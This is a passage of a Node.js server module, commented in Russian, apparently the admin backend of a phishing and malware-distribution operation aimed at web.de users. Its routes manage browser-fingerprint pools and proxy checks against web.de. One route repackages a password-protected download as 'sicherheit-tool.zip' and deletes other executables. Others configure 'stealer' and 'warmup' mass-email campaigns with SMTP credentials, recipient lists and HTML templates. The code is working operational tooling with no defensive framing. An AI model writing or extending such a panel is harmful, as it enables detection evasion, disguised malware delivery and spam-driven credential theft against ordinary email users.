      if (fs.existsSync(WEBDE_FP_INDICES_FILE)) content = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
    } catch (e) {}
    const poolPayload = buildWebdeFingerprintsListPayload();
    return send(res, 200, {
      content,
      pool: poolPayload,
    });
  }

  if (pathname === '/api/config/webde-fingerprint-indices' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (json.probePause === true || json.probePause === 'true' || json.probePause === 1) {
        return handleWebdeFingerprintProbePause(res, json);
      }
      if (json.probeResume === true || json.probeResume === 'true' || json.probeResume === 1) {
        return handleWebdeFingerprintProbeResume(res, json);
      }
      if (json.probeStart === true || json.probeStart === 'true' || json.probeStart === 1) {
        return handleWebdeFingerprintProbeStart(res, json);
      }
      const content = json.content != null ? String(json.content) : '';
      try {
        const dir = path.dirname(WEBDE_FP_INDICES_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(WEBDE_FP_INDICES_FILE, content, 'utf8');
        const lineCount = content.split(/\r?\n/).filter(function (l) {
          const t = (l || '').trim();
          return t.length > 0 && !t.startsWith('#');
        }).length;
        console.log('[CONFIG] Сохранён webde_fingerprint_indices.txt: ' + WEBDE_FP_INDICES_FILE + ', строк: ' + lineCount);
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write fingerprint indices file' });
      }
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/config/webde-fingerprints-list' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, buildWebdeFingerprintsListPayload());
  }

  if (pathname === '/api/config/webde-fingerprint-probe-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      return handleWebdeFingerprintProbeStart(res, json);
    });
    return true;
  }

  if (pathname === '/api/config/webde-fingerprint-probe-status' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const jobId = (q.jobId != null && String(q.jobId).trim()) ? String(q.jobId).trim() : '';
    return sendWebdeFingerprintProbeStatus(res, jobId);
  }

  /** Только выдача пула отпечатков + индексов (без проверки прокси). GET + query — если POST-тело режется прокси. */
  if (pathname === '/api/config/proxies-validate' && req.method === 'GET') {
    const q = (parsed && parsed.query) || {};
    if (q.webdeFpBundle === '1' || q.webdeFpBundle === 'true' || q.webdeFpBundle === 'yes') {
      if (!checkAdminAuth(req, res)) return;
      let indicesContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (e) {}
      const poolPayload = buildWebdeFingerprintsListPayload();
      return send(res, 200, {
        valid: [],
        invalid: [],
        webdeIndices: { content: indicesContent, pool: poolPayload },
      });
    }
  }

  /** Проверка прокси: сначала TCP, при отказе — HTTPS через прокси (реальный запрос). */
  if (pathname === '/api/config/proxies-validate' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const pq = (parsed && parsed.query) || {};
      const content = json.content != null ? String(json.content) : '';
      const lines = content.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
      const valid = [];
      const invalid = [];
      const timeoutMs = Math.min(15000, Math.max(3000, parseInt(json.timeoutMs, 10) || 8000));
      const testUrl = 'https://www.web.de/';

      function testProxyTcp(parsed) {
        return new Promise((resolve) => {
          const socket = net.createConnection(parsed.port, parsed.host, () => {
            socket.destroy();
            resolve({ ok: true });
          });
          socket.setTimeout(Math.min(timeoutMs, 5000));
          socket.on('timeout', () => {
            socket.destroy();
            resolve({ ok: false, error: 'Таймаут TCP' });
          });
          socket.on('error', (err) => {
            resolve({ ok: false, error: (err && err.message) || 'Ошибка подключения' });
          });
        });
      }

      function buildProxyUrl(parsed) {
        const enc = (s) => encodeURIComponent(String(s || ''));
        if (parsed.login || parsed.password) {
          return 'http://' + enc(parsed.login) + ':' + enc(parsed.password) + '@' + parsed.host + ':' + parsed.port;
        }
        return 'http://' + parsed.host + ':' + parsed.port;
      }

      function testProxyHttps(parsed) {
        return new Promise((resolve) => {
          if (!HttpsProxyAgent) {
            resolve({ ok: false, error: 'Модуль https-proxy-agent не установлен' });
            return;
          }
          const proxyUrl = buildProxyUrl(parsed);
          const agent = new HttpsProxyAgent(proxyUrl, { timeout: timeoutMs });
          const reqHttps = https.get(testUrl, { agent: agent, timeout: timeoutMs }, (resHttps) => {
            resHttps.destroy();
            resolve({ ok: true });
          });
          reqHttps.on('error', (err) => {
            resolve({ ok: false, error: (err && err.message) || 'Ошибка HTTPS через прокси' });
          });
          reqHttps.setTimeout(timeoutMs, () => {
            reqHttps.destroy();
            resolve({ ok: false, error: 'Таймаут HTTPS' });
          });
        });
      }

      const includeWebdeFpBundle =
        pq.webdeFpBundle === '1' ||
        pq.webdeFpBundle === 'true' ||
        pq.webdeFpBundle === 'yes' ||
        json.includeWebdeFpBundle === true ||
        json.includeWebdeFpBundle === 'true' ||
        json.includeWebdeFpBundle === 1;

      (async () => {
        for (const line of lines) {
          if (line.startsWith('#')) continue;
          const parsed = normalizeProxyLine(line);
          if (!parsed) {
            invalid.push({ line, error: 'Неверный формат (host:port[:login:password] или login:password:host:port, разделители : ; |)' });
            continue;
          }
          let result = await testProxyTcp(parsed);
          if (!result.ok && HttpsProxyAgent) {
            result = await testProxyHttps(parsed);
          }
          if (result.ok) valid.push({ line, normalized: parsed.normalized });
          else invalid.push({ line, error: result.error, normalized: parsed.normalized });
        }
        const out = { valid, invalid };
        if (includeWebdeFpBundle) {
          let indicesContent = '';
          try {
            if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
          } catch (e) {}
          const poolPayload = buildWebdeFingerprintsListPayload();
          out.webdeIndices = { content: indicesContent, pool: poolPayload };
        }
        return send(res, 200, out);
      })();
    });
    return true;
  }

  if (pathname === '/api/config/zip-process' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const sourceFileName = path.basename((json.sourceFileName || '').trim().replace(/\0/g, '').replace(/\.\./g, ''));
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      let newZipName = (json.newZipName || '').trim().replace(/[^a-zA-Z0-9._-]/g, '') || 'sicherheit-tool.zip';
      if (!newZipName.toLowerCase().endsWith('.zip')) newZipName += '.zip';
      const renames = json.renames && typeof json.renames === 'object' ? json.renames : {};
      const sourcePath = path.join(DOWNLOADS_DIR, sourceFileName);
      if (!sourceFileName || !fs.existsSync(sourcePath) || path.extname(sourcePath).toLowerCase() !== '.zip') {
        return send(res, 400, { ok: false, error: 'Source zip not found or not a zip' });
      }
      const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
      const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
      try {
        fs.mkdirSync(tempDir, { recursive: true });
        const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
        const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
        const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
        const extracted = fs.readdirSync(tempDir).length > 0;
        if (!extracted) {
          const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
          const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
          return send(res, 500, { ok: false, error: friendly });
        }
        const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
        function safeSegment(name) {
          const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
          return s || null;
        }
        for (const r of renameList) {
          const from = safeSegment(r.from || r[0] || '');
          const to = safeSegment(r.to || r[1] || '');
          if (!from || !to || from === to) continue;
          const oldP = path.join(tempDir, from);
          const newP = path.join(tempDir, to);
          if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
          if (fs.existsSync(oldP)) {
            fs.renameSync(oldP, newP);
          }
        }
        const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
        execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
        const finalPath = path.join(DOWNLOADS_DIR, newZipName);
        fs.copyFileSync(outZipPath, finalPath);
        const names = fs.readdirSync(DOWNLOADS_DIR);
        for (let i = 0; i < names.length; i++) {
          const n = names[i];
          const lower = n.toLowerCase();
          if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== newZipName) {
            try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
          }
        }
        writeZipPassword(newPassword);
        send(res, 200, { ok: true, fileName: newZipName });
      } catch (e) {
        const msg = (e.stderr && e.stderr.toString()) || e.message || String(e);
        let friendly = msg.length > 80 ? 'Ошибка при обработке архива.' : msg;
        if (/zip:\s*not found|command not found.*zip/i.test(msg)) {
          friendly = 'На сервере не установлена программа zip. Установите: apt install zip (или yum install zip)';
        }
        send(res, 500, { ok: false, error: friendly });
      } finally {
        try {
          if (fs.existsSync(tempDir)) {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
          }
          if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
        } catch (e) {}
      }
    });
    return true;
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readStealerEmailConfig();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      recipientsList: (cur && cur.recipientsList) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64),
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || ''
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readStealerEmailConfig();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'cfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', html: '', senderName: '', title: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.recipientsList != null) cfg.recipientsList = String(json.recipientsList);
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeStealerEmailConfig(data);
      sendStealerFailedSmtpEmails.clear();
      return send(res, 200, { ok: true, id: configId });
    });
    return true;
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readStealerEmailConfig();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeStealerEmailConfig(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/stealer-email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readStealerEmailConfig();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeStealerEmailConfig(data);
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/config/email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readConfigEmail();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64)
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readConfigEmail();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'cfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', senderName: '', title: '', html: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeConfigEmail(data);
      return send(res, 200, { ok: true, id: configId });
    });
    return true;
  }

  if (pathname === '/api/config/email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readConfigEmail();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeConfigEmail(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readConfigEmail();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeConfigEmail(data);
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readWarmupEmailConfig();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      recipientsList: (cur && cur.recipientsList) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64),
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || ''
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readWarmupEmailConfig();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'wcfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.recipientsList != null) cfg.recipientsList = String(json.recipientsList);
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeWarmupEmailConfig(data);
      return send(res, 200, { ok: true, id: configId });
    });
    return true;
  }

  if (pathname === '/api/config/warmup-email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readWarmupEmailConfig();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeWarmupEmailConfig(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/warmup-email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readWarmupEmailConfig();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeWarmupEmailConfig(data);
      return send(res, 200, { ok: true });
    });
    return true;
  }


  }
  return false;
}

module.exports = { handle };
